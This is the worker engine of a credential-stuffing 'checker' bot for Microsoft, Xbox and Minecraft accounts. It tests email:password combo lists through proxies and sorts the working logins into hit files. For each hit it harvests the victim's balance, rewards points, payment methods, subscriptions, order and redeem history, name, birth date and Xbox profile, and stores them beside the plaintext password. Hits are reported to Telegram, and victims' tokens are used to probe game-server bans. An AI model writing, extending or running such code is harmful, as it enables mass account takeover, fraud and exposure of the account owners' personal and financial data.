"""The check engine — runs N worker threads against a combo list.

For each combo:
1. Authenticate against Microsoft (login + Xbox + XSTS + MC token).
2. If MC entitlement → capture MC profile + Hypixel + Hypixel ban + Donut.
3. Either way (MC or MSA-only) → capture MS extras (balance, points, payment
   methods, subscriptions, redeem history, profile, Xbox profile).
4. Record the hit, update the live progress dashboard, fire ``on_hit``.

All side effects (file writes, Telegram notifications) flow through
:class:`ResultStore` and :class:`Progress`, both threadsafe.
"""

from __future__ import annotations

import logging
import threading
from concurrent.futures import ThreadPoolExecutor, wait
from typing import Callable, Optional

from ..auth.microsoft import authenticate
from ..auth.proxies import ProxyPool
from ..capture.capture import Capture
from ..capture.donut import fetch_donut, is_enabled as donut_enabled
from ..capture.donut_ban import check_donut_ban
from ..capture.hypixel import fetch_hypixel
from ..capture.hypixel_ban import check_hypixel_ban
from ..capture.microsoft import (
    fetch_balance, fetch_payment_methods, fetch_rewards_points,
)
from ..capture.microsoft_extras import (
    fetch_ms_profile, fetch_orders, fetch_redeem_history,
    fetch_subscriptions, fetch_xbox_profile,
)
from ..capture.minecraft import fetch_minecraft_capture
from .progress import Progress
from .results import ResultStore

log = logging.getLogger(__name__)


class CheckEngine:
    """Self-contained worker-pool checker.

    The engine is intentionally synchronous internally — it spawns its own
    threads and reports through the threadsafe :class:`Progress` object. The
    asyncio side of the bot just runs ``engine.start()`` in an executor and
    polls progress to update the Telegram message.
    """

    def __init__(
        self,
        *,
        combos: list[str],
        proxies: list[str],
        threads: int,
        progress: Progress,
        results: ResultStore,
        on_hit: Optional[Callable[[Capture], None]] = None,
        hypixel_ban_check: bool = True,
        donut_ban_check: bool = True,
    ) -> None:
        self.combos = list(combos)
        self.proxy_pool = ProxyPool(proxies)
        self.threads = max(1, min(threads, max(1, len(self.combos))))
        self.progress = progress
        self.results = results
        self.on_hit = on_hit
        self.hypixel_ban_check = hypixel_ban_check
        self.donut_ban_check = donut_ban_check
        self._stop = threading.Event()
        self._token_cache: dict = {}

    def stop(self) -> None:
        self._stop.set()

    def start(self) -> None:
        if not self.combos:
            return
        with ThreadPoolExecutor(max_workers=self.threads, thread_name_prefix="naksh-") as ex:
            futures = [ex.submit(self._check_one, combo) for combo in self.combos]
            wait(futures)
        # Post-job: sort numeric capture files (MS_Points / MS_Balance) so
        # the highest values appear at the top of each text file.
        self.results.finalize()

    # ------------------------------------------------------------------
    def _check_one(self, combo: str) -> None:
        if self._stop.is_set():
            return
        if ":" not in combo:
            self.progress.error()
            self.results.write("Errors", f"{combo}  (no colon)")
            return
        email, password = combo.split(":", 1)
        email, password = email.strip(), password.strip()
        self.progress.begin_check(email)

        try:
            res = authenticate(email, password, pool=self.proxy_pool or None)
        except Exception as exc:
            log.exception("auth crash for %s", email)
            self.progress.error()
            self.results.write("Errors", f"{email}:{password}  ({exc})")
            return

        if res.status == "2fa":
            self.progress.twofa()
            self.results.write("2fa", f"{email}:{password}")
            return
        if res.status == "bad":
            self.progress.bad()
            self.results.write("Bad", f"{email}:{password}")
            return
        if res.status == "error":
            self.progress.error()
            self.results.write("Errors", f"{email}:{password}  ({res.detail})")
            return

        capture = Capture(email=email, password=password)

        if res.status == "msa_only":
            # No Minecraft entitlement, but the MSA login is real — capture
            # everything we can from the live.com session.
            capture.account_type = "MSA Only"
            try:
                self._capture_ms_extras(res, capture)
                self._capture_xbox_profile(res, capture)
            except Exception:
                log.exception("msa-only capture failed for %s", email)
            self._record_hit(capture)
            return

        # status == "hit" → full Minecraft account
        try:
            self._capture_minecraft(res, capture)
            if not capture.account_type or capture.account_type == "Unknown":
                # Token exists but no MC entitlement → not a true hit.
                self.progress.bad()
                self.results.write("Bad", f"{email}:{password}  (no MC entitlement)")
                return
            self._capture_hypixel(capture)
            self._capture_donut(capture, res)
            self._capture_ms_extras(res, capture)
            self._capture_xbox_profile(res, capture)
        except Exception as exc:
            log.exception("capture failed for %s", email)
            # We still got a valid login → treat as a Hit but log the error.
            self.results.write("Errors", f"{email}:{password}  (capture: {exc})")

        self._record_hit(capture)

    # ------------------------------------------------------------------
    def _capture_minecraft(self, res, capture: Capture) -> None:
        account_type, username, uuid_str, capes = fetch_minecraft_capture(
            res.session, res.mc_token,
        )
        capture.account_type = account_type or "Unknown"
        capture.mc_username = username
        capture.uuid = uuid_str
        capture.capes = capes

    def _capture_hypixel(self, capture: Capture) -> None:
        hx = fetch_hypixel(capture.mc_username, capture.uuid)
        if hx:
            capture.hypixel_level = hx.get("level")
            capture.hypixel_first_login = (
                str(hx.get("first_login")) if hx.get("first_login") else None
            )
            capture.hypixel_last_login = (
                str(hx.get("last_login")) if hx.get("last_login") else None
            )
            capture.bedwars_stars = hx.get("bedwars_stars")
            capture.skywars_stars = hx.get("skywars_stars")
            capture.skyblock_coins = hx.get("skyblock_coins")
            capture.skyblock_networth = hx.get("skyblock_networth")
            capture.skyblock_level = hx.get("skyblock_level")
            self.results.write_dedupe(
                "Hypixel_Capture",
                _hypixel_line(capture, hx),
            )

        if self.hypixel_ban_check:
            banned = check_hypixel_ban(capture.mc_username)
            if banned is True:
                self.progress.report_hypixel_ban()
                self.results.write_dedupe(
                    "Hypixel_Bans",
                    f"{capture.email}:{capture.password} | "
                    f"user={capture.mc_username}",
                )

    def _capture_donut(self, capture: Capture, res) -> None:
        # Path 1: optional API capture (money/kills/playtime/rank). Only
        # active when DONUT_API_KEY is set — otherwise the call no-ops.
        if donut_enabled():
            donut = fetch_donut(capture.mc_username)
            if donut:
                capture.donut_money = str(donut.get("money") or "")
                capture.donut_kills = donut.get("kills")
                capture.donut_playtime = str(donut.get("playtime") or "")
                if donut.get("banned"):
                    capture.donut_banned = True
                self.results.write_dedupe(
                    "Donut_Capture", _donut_line(capture, donut),
                )

        # Path 2: real MC-protocol ban check. Doesn't need an API key — it
        # logs into donutsmp.net:25565 with the player's MSA-derived token
        # and checks whether the proxy disconnects us with a ban message.
        if not self.donut_ban_check:
            return
        if not (capture.mc_username and capture.uuid and res.mc_token):
            return
        ban = check_donut_ban(
            username=capture.mc_username,
            player_uuid=capture.uuid,
            access_token=res.mc_token,
        )
        if ban.banned is True:
            capture.donut_banned = True
            capture.donut_ban_reason = ban.reason
            capture.donut_ban_time_left = ban.time_left
            capture.donut_ban_id = ban.ban_id
            self.progress.report_donut_ban()
            line = (
                f"{capture.email}:{capture.password} | user={capture.mc_username}"
            )
            extras = []
            if ban.reason:
                extras.append(f"reason={ban.reason}")
            if ban.time_left:
                extras.append(f"time_left={ban.time_left}")
            if ban.ban_id:
                extras.append(f"ban_id=#{ban.ban_id}")
            if extras:
                line += " | " + " | ".join(extras)
            self.results.write_dedupe("Donut_Bans", line)

    def _capture_ms_extras(self, res, capture: Capture) -> None:
        try:
            bal = fetch_balance(res.session, self._token_cache)
        except Exception:
            log.exception("balance fetch error for %s", capture.email)
            bal = None
        if bal:
            display, value, currency = bal
            capture.ms_balance = display
            capture.ms_balance_value = value
            capture.ms_balance_currency = currency
            self.progress.report_balance(capture.email, value, display)
            self.results.write_dedupe(
                "MS_Balance",
                f"{capture.email}:{capture.password} | value={value} | "
                f"currency={currency} | display={display}",
            )

        try:
            points = fetch_rewards_points(res.session)
        except Exception:
            log.exception("rewards fetch error for %s", capture.email)
            points = None
        if points:
            display, value = points
            capture.ms_rewards = display
            capture.ms_rewards_value = value
            self.progress.report_points(capture.email, value)
            self.results.write_dedupe(
                "MS_Points",
                f"{capture.email}:{capture.password} | points={value}",
            )

        try:
            payments = fetch_payment_methods(res.session, self._token_cache)
        except Exception:
            log.exception("payments fetch error for %s", capture.email)
            payments = []
        if payments:
            capture.ms_payment_methods = payments
            self.progress.report_payment_methods(len(payments))
            self.results.write_dedupe(
                "MS_Payments",
                f"{capture.email}:{capture.password} | "
                + " ; ".join(payments),
            )

        try:
            subs = fetch_subscriptions(res.session)
        except Exception:
            log.exception("subscriptions fetch error for %s", capture.email)
            subs = []
        if subs:
            capture.ms_subscriptions = subs
            self.progress.report_subscriptions(len(subs))
            self.results.write_dedupe(
                "MS_Subscriptions",
                f"{capture.email}:{capture.password} | "
                + " ; ".join(subs),
            )

        try:
            redeem = fetch_redeem_history(res.session)
        except Exception:
            log.exception("redeem-history fetch error for %s", capture.email)
            redeem = []
        if redeem:
            capture.ms_redeem_history = redeem
            self.progress.report_redeem_codes(len(redeem))
            self.results.write_dedupe(
                "MS_RedeemHistory",
                f"{capture.email}:{capture.password} | "
                + " ; ".join(redeem),
            )

        try:
            orders = fetch_orders(res.session)
        except Exception:
            log.exception("orders fetch error for %s", capture.email)
            orders = []
        if orders:
            capture.ms_orders = orders
            self.results.write_dedupe(
                "MS_Orders",
                f"{capture.email}:{capture.password} | "
                + " ; ".join(orders),
            )

        try:
            profile = fetch_ms_profile(res.session)
        except Exception:
            log.exception("ms profile fetch error for %s", capture.email)
            profile = None
        if profile:
            capture.ms_country = profile.get("country")
            capture.ms_country_code = profile.get("country_code")
            capture.ms_region = profile.get("region")
            capture.ms_age_group = profile.get("ageGroup")
            capture.ms_first_name = profile.get("firstName")
            capture.ms_last_name = profile.get("lastName")
            capture.ms_date_of_birth = profile.get("dateOfBirth")
            self.results.write_dedupe(
                "MS_Profile",
                f"{capture.email}:{capture.password} | "
                + " ; ".join(f"{k}={v}" for k, v in profile.items()),
            )

    def _capture_xbox_profile(self, res, capture: Capture) -> None:
        try:
            xbox = fetch_xbox_profile(res.session, res.xbox_token, res.uhs)
        except Exception:
            log.exception("xbox profile fetch error for %s", capture.email)
            xbox = None
        if not xbox:
            return
        capture.xbox_xuid = str(xbox.get("xuid") or "") or None
        capture.xbox_gamertag = xbox.get("gamertag") or xbox.get("gamedisplayname")
        capture.xbox_gamerscore = (
            str(xbox.get("gamerscore")) if xbox.get("gamerscore") else None
        )
        capture.xbox_account_tier = xbox.get("accounttier")
        capture.xbox_tenure_level = (
            str(xbox.get("tenurelevel")) if xbox.get("tenurelevel") else None
        )
        self.results.write_dedupe(
            "Xbox_Profile",
            f"{capture.email}:{capture.password} | "
            + " ; ".join(f"{k}={v}" for k, v in xbox.items() if v is not None),
        )

    # ------------------------------------------------------------------
    def _record_hit(self, capture: Capture) -> None:
        self.progress.hit(capture.account_type, label=capture.short_label())

        line = f"{capture.email}:{capture.password}"
        self.results.write("Hits", line)

        # Per-tier files
        atype = capture.account_type.upper()
        if "ULTIMATE" in atype:
            self.results.write("XGPU", line)
        elif "GAME PASS" in atype:
            self.results.write("XGP", line)
        if "NORMAL" in atype or "MINECRAFT" in atype:
            self.results.write("Normal", line)
        if capture.is_msa_only():
            self.results.write("MSA", line)

        # Pretty capture line
        self.results.write("Capture", capture.builder())

        if self.on_hit:
            try:
                self.on_hit(capture)
            except Exception:
                log.exception("on_hit callback raised")


def _hypixel_line(capture: Capture, hx: dict) -> str:
    bits = [f"{capture.email}:{capture.password}", f"user={capture.mc_username}"]
    if hx.get("level"):
        bits.append(f"Lvl={hx['level']:.0f}")
    if hx.get("bedwars_stars"):
        bits.append(f"BW={hx['bedwars_stars']}★")
    if hx.get("skywars_stars"):
        bits.append(f"SW={hx['skywars_stars']}★")
    if hx.get("skyblock_networth"):
        bits.append(f"SB_NW={hx['skyblock_networth']}")
    if hx.get("skyblock_coins"):
        bits.append(f"SB_Coins={hx['skyblock_coins']}")
    if hx.get("skyblock_level"):
        bits.append(f"SB_Lvl={hx['skyblock_level']}")
    return " | ".join(bits)


def _donut_line(capture: Capture, donut: dict) -> str:
    bits = [f"{capture.email}:{capture.password}", f"user={capture.mc_username}"]
    if donut.get("money") is not None:
        bits.append(f"Money={donut['money']}")
    if donut.get("kills") is not None:
        bits.append(f"Kills={donut['kills']}")
    if donut.get("deaths") is not None:
        bits.append(f"Deaths={donut['deaths']}")
    if donut.get("playtime") is not None:
        bits.append(f"Playtime={donut['playtime']}")
    if donut.get("rank"):
        bits.append(f"Rank={donut['rank']}")
    bits.append(f"Banned={'YES' if donut.get('banned') else 'NO'}")
    return " | ".join(bits)
